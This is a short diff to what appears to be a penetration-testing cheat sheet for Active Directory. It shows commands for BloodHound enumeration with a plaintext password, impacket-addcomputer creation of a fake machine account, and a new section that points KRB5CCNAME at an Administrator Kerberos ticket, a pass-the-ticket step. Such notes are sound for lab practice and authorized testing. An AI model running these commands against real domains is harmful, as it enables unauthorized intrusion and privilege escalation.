@@ -140,3 +140,8 @@ bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.co
 ```bash
 impacket-addcomputer ignite.local/geet:Password@1 -computer-name fakepc -computer-pass Password@123 -dc-ip 192.168.1.14
 ```
+---
+# linux ticket environment
+```bash
+export KRB5CCNAME=./Administrator.ccache
+```
